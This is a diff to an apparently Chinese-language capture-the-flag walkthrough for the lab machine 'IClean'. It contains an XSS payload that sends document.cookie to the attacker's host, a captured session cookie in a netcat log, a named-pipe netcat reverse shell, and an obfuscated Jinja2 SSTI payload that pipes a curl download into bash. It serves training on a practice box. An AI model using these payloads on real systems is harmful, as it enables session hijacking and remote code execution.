@@ -56,7 +56,7 @@ echo "10.10.11.12 capiclean.htb" >> /etc/hosts
 
 payload
 ```
-<img src=x onerror=fetch('http://10.10.16.7:80/'+document.cookie);>
+<img src=x onerror=fetch('http://10.10.16.5:80/'+document.cookie);>
 ```
 
 urlencode后插入到service这个字段
@@ -68,9 +68,9 @@ urlencode后插入到service这个字段
 ┌──(root㉿kali)-[~]
 └─# nc -lnvp 80
 listening on [any] 80 ...
-connect to [10.10.16.7] from (UNKNOWN) [10.10.11.12] 37172
-GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqNd_g.VDE31OULcrAvemakBCPxzJBMTCU HTTP/1.1
-Host: 10.10.16.7
+connect to [10.10.16.5] from (UNKNOWN) [10.10.11.12] 42720
+GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqdtFg.kzjQBBHOHIO2dg2aorvGQoGaEGg HTTP/1.1
+Host: 10.10.16.5
 Connection: keep-alive
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
 Accept: */*
@@ -78,4 +78,32 @@ Origin: http://127.0.0.1:3000
 Referer: http://127.0.0.1:3000/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
+
+
 ```
+
+使用cookie-editer加上上面cookie，可以访问dashboard
+
+
+在Generate Invoice生成一个Invoice ID以后去到Generate QR页面
+
+参考[这篇文章](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)
+
+
+revshell
+```
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 443 >/tmp/f
+```
+
+payload
+```
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.10.16.5:80/revshell | bash")|attr("read")()}}
+```
+
+注入qr_link
+
+![](IClean_files/2.jpg)
+
+拿到rev shell
+
+![](IClean_files/3.jpg)
